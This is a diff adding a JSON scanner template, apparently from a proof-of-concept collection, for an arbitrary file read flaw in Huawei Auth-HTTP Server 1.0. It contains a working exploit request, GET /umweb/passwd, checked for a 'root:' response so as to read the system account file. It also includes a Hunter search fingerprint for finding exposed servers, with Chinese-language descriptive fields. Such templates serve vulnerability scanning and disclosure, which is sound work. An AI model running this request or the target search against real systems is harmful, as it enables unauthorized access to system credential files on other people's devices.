@@ -1,0 +1,35 @@
+{
+  "product": "Huawei Auth-HTTP Server 1.0",
+  "vul_name": "Huawei Auth-HTTP Server 1.0 存在任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "华为Auth-Http服务存在文件读取漏洞。访问umweb/passwd可以读取文件敏感信息。",
+  "version": "",
+  "note": "",
+  "search": {
+    "Hunter": "web.icon==\"be2408ce4716a5cfc50dd0ada76619d6\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_37113223/article/details/135062227",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/umweb/passwd"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "root:"
+        }
+      ]
+    }
+  }
+}
